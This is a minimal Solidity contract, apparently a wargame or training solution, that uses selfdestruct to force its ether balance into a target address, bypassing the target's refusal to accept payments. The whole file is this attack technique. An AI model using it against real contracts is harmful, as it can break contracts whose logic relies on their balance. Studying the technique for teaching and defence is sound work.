// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack{
    function att(address addr) public payable{
        selfdestruct(payable(addr));
    }
}